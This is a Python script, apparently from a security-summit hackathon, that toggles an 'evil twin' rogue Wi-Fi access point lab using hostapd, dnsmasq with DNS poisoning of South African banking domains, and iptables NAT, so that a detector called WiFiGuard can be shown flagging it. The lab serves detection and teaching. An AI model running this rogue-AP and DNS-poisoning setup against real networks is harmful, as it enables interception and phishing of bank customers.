#!/usr/bin/env python3
"""
WiFiGuard Evil Twin Lab — toggle.py
Team Themis | ITWeb Security Summit 2026 | SS26Hack

Live demo control script for the rogue AP lab.
Starts, stops, and reports the status of the Evil Twin
(hostapd + dnsmasq + iptables) in a single command.

Usage:
    python3 toggle.py on      — Launch Evil Twin
    python3 toggle.py off     — Tear it down, restore network
    python3 toggle.py status  — Print current state

All events are appended to events.json for the FastAPI
dashboard (dashboard/main.py) to consume.

Requirements:
    sudo apt install hostapd dnsmasq iptables python3
    WiFi adapter with AP mode support on IFACE_AP (see config below)
"""

import json
import os
import signal
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

# ── Configuration ────────────────────────────────────────────────────────────

# Interface used to HOST the rogue AP (must support AP mode)
IFACE_AP = "wlan1"

# IP address assigned to the rogue AP interface (gateway + DNS for victims)
AP_IP = "192.168.1.1"
AP_NETMASK = "24"

# Paths (relative to this script's directory)
SCRIPT_DIR = Path(__file__).parent
CONFIGS_DIR = SCRIPT_DIR / "configs"
HOSTAPD_CONF = CONFIGS_DIR / "evil_twin.conf"
DNSMASQ_CONF = CONFIGS_DIR / "dnsmasq.conf"
EVENTS_FILE = SCRIPT_DIR / "events.json"
PID_FILE = SCRIPT_DIR / ".evil_twin.pids"

# ── Event logging ─────────────────────────────────────────────────────────────

def log_event(action: str, detail: str = "", verdict_triggered: str = "") -> dict:
    """Append a timestamped event to events.json and return it."""
    events = []
    if EVENTS_FILE.exists():
        try:
            events = json.loads(EVENTS_FILE.read_text())
        except json.JSONDecodeError:
            events = []

    event = {
        "id": len(events) + 1,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "timestamp_local": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "action": action,
        "detail": detail,
        "verdict_triggered": verdict_triggered,
        "interface": IFACE_AP,
        "ap_ip": AP_IP,
    }

    events.append(event)
    EVENTS_FILE.write_text(json.dumps(events, indent=2))
    return event


# ── Process helpers ───────────────────────────────────────────────────────────

def run(cmd: list[str], check: bool = True, capture: bool = False) -> subprocess.CompletedProcess:
    """Run a shell command, optionally checking for errors."""
    kwargs = {"capture_output": capture}
    if check:
        return subprocess.run(cmd, check=True, **kwargs)
    return subprocess.run(cmd, **kwargs)


def pid_running(pid: int) -> bool:
    """Return True if a process with this PID is alive."""
    try:
        os.kill(pid, 0)
        return True
    except (ProcessLookupError, PermissionError):
        return False


def save_pids(hostapd_pid: int, dnsmasq_pid: int) -> None:
    PID_FILE.write_text(json.dumps({"hostapd": hostapd_pid, "dnsmasq": dnsmasq_pid}))


def load_pids() -> dict | None:
    if not PID_FILE.exists():
        return None
    try:
        return json.loads(PID_FILE.read_text())
    except (json.JSONDecodeError, KeyError):
        return None


def clear_pids() -> None:
    if PID_FILE.exists():
        PID_FILE.unlink()


# ── Network setup / teardown ──────────────────────────────────────────────────

def bring_up_interface() -> None:
    """Assign IP to AP interface and bring it up."""
    print(f"[*] Bringing up {IFACE_AP} at {AP_IP}/{AP_NETMASK} ...")
    run(["sudo", "ip", "addr", "flush", "dev", IFACE_AP], check=False)
    run(["sudo", "ip", "addr", "add", f"{AP_IP}/{AP_NETMASK}", "dev", IFACE_AP])
    run(["sudo", "ip", "link", "set", IFACE_AP, "up"])


def enable_forwarding() -> None:
    """Enable IP forwarding so Evil Twin clients can reach the internet."""
    run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], capture=True)
    # NAT traffic from AP subnet out the uplink interface
    # Adjust 'wlan0' if your internet-connected interface differs
    run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
         "-s", f"{AP_IP}/{AP_NETMASK}", "-o", "wlan0", "-j", "MASQUERADE"], check=False)


def disable_forwarding() -> None:
    run(["sudo", "iptables", "-t", "nat", "-D", "POSTROUTING",
         "-s", f"{AP_IP}/{AP_NETMASK}", "-o", "wlan0", "-j", "MASQUERADE"], check=False)
    run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture=True)


def bring_down_interface() -> None:
    run(["sudo", "ip", "addr", "flush", "dev", IFACE_AP], check=False)


# ── Core toggle actions ───────────────────────────────────────────────────────

def start_evil_twin() -> None:
    """Launch hostapd + dnsmasq and record the event."""
    pids = load_pids()
    if pids and pid_running(pids.get("hostapd", 0)):
        print("[!] Evil Twin is already running. Use 'status' to check.")
        sys.exit(1)

    print("\n╔══════════════════════════════════════════╗")
    print("║   WiFiGuard Evil Twin Lab  —  STARTING   ║")
    print("╚══════════════════════════════════════════╝\n")

    bring_up_interface()
    enable_forwarding()

    # Start hostapd (rogue AP)
    print("[*] Starting hostapd (rogue access point) ...")
    hostapd_proc = subprocess.Popen(
        ["sudo", "hostapd", str(HOSTAPD_CONF)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(2)  # give hostapd time to bind the interface

    if hostapd_proc.poll() is not None:
        print("[✗] hostapd failed to start. Check:")
        print(f"    sudo hostapd {HOSTAPD_CONF}   (run manually for verbose errors)")
        print("    Ensure the adapter supports AP mode:  iw list | grep -A 10 'Supported interface modes'")
        log_event("START_FAILED", "hostapd exited immediately")
        sys.exit(1)

    # Start dnsmasq (DHCP + DNS poisoning)
    print("[*] Starting dnsmasq (DHCP + DNS poisoning) ...")
    dnsmasq_proc = subprocess.Popen(
        ["sudo", "dnsmasq", "--conf-file=" + str(DNSMASQ_CONF), "--no-daemon"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1)

    if dnsmasq_proc.poll() is not None:
        print("[✗] dnsmasq failed to start. Killing hostapd and aborting.")
        hostapd_proc.terminate()
        log_event("START_FAILED", "dnsmasq exited immediately")
        sys.exit(1)

    save_pids(hostapd_proc.pid, dnsmasq_proc.pid)
    event = log_event(
        action="EVIL_TWIN_ON",
        detail=f"Rogue AP active on {IFACE_AP}. DNS poisoning: SA banking domains → {AP_IP}",
        verdict_triggered="BLOCKED",
    )

    print("\n[✓] Evil Twin is LIVE")
    print(f"    SSID       : see {HOSTAPD_CONF.name}")
    print(f"    Interface  : {IFACE_AP}  ({AP_IP})")
    print(f"    DNS poison : SA banking domains → {AP_IP}")
    print(f"    Event ID   : {event['id']}  ({event['timestamp_local']})")
    print("\n    WiFiGuard should now return: 🚫 BLOCKED\n")


def stop_evil_twin() -> None:
    """Shut down the Evil Twin and restore the network."""
    print("\n╔══════════════════════════════════════════╗")
    print("║   WiFiGuard Evil Twin Lab  —  STOPPING   ║")
    print("╚══════════════════════════════════════════╝\n")

    pids = load_pids()
    stopped_something = False

    if pids:
        for name, pid in pids.items():
            if pid and pid_running(pid):
                print(f"[*] Stopping {name} (PID {pid}) ...")
                try:
                    os.kill(pid, signal.SIGTERM)
                    time.sleep(0.5)
                    if pid_running(pid):
                        os.kill(pid, signal.SIGKILL)
                    stopped_something = True
                except PermissionError:
                    # Process owned by root — use sudo kill
                    run(["sudo", "kill", str(pid)], check=False)
                    stopped_something = True
            else:
                print(f"[!] {name} (PID {pid}) was not running — skipping")

    # Belt-and-suspenders: kill any stray processes by name
    for proc_name in ["hostapd", "dnsmasq"]:
        run(["sudo", "pkill", "-f", proc_name], check=False)

    disable_forwarding()
    bring_down_interface()
    clear_pids()

    if stopped_something:
        event = log_event(
            action="EVIL_TWIN_OFF",
            detail=f"Rogue AP on {IFACE_AP} torn down. Network restored.",
            verdict_triggered="SAFE",
        )
        print(f"\n[✓] Evil Twin is DOWN")
        print(f"    Event ID   : {event['id']}  ({event['timestamp_local']})")
        print("\n    WiFiGuard should now return: ✅ SAFE\n")
    else:
        print("[!] No running Evil Twin processes found — nothing to stop.")
        log_event("STOP_NOP", "No processes were running")


def print_status() -> None:
    """Print current state of the Evil Twin lab."""
    pids = load_pids()

    print("\n╔══════════════════════════════════════════╗")
    print("║   WiFiGuard Evil Twin Lab  —  STATUS     ║")
    print("╚══════════════════════════════════════════╝\n")

    if pids:
        hostapd_alive = pid_running(pids.get("hostapd", 0))
        dnsmasq_alive = pid_running(pids.get("dnsmasq", 0))
        state = "🟢 RUNNING" if (hostapd_alive and dnsmasq_alive) else "🔴 PARTIAL / DEGRADED"

        print(f"  State      : {state}")
        print(f"  hostapd    : {'alive' if hostapd_alive else 'dead'} (PID {pids.get('hostapd')})")
        print(f"  dnsmasq    : {'alive' if dnsmasq_alive else 'dead'} (PID {pids.get('dnsmasq')})")
        print(f"  Interface  : {IFACE_AP}  ({AP_IP})")
    else:
        print("  State      : ⚫ OFF — no Evil Twin running")

    # Show last 5 events
    if EVENTS_FILE.exists():
        try:
            events = json.loads(EVENTS_FILE.read_text())
            recent = events[-5:]
            if recent:
                print(f"\n  Last {len(recent)} event(s) from events.json:")
                for e in recent:
                    verdict = f"  [{e.get('verdict_triggered', '—')}]" if e.get('verdict_triggered') else ""
                    print(f"    #{e['id']}  {e['timestamp_local']}  {e['action']}{verdict}")
        except (json.JSONDecodeError, KeyError):
            pass

    print()


# ── Entry point ───────────────────────────────────────────────────────────────

USAGE = """
Usage:
    python3 toggle.py on      — Start Evil Twin (hostapd + dnsmasq + iptables)
    python3 toggle.py off     — Stop Evil Twin, restore clean network
    python3 toggle.py status  — Show current state and recent events

Note: on/off require sudo privileges (called internally via subprocess).
"""

def main() -> None:
    if len(sys.argv) != 2 or sys.argv[1] not in ("on", "off", "status"):
        print(USAGE)
        sys.exit(1)

    command = sys.argv[1]

    if command == "on":
        start_evil_twin()
    elif command == "off":
        stop_evil_twin()
    elif command == "status":
        print_status()


if __name__ == "__main__":
    main()
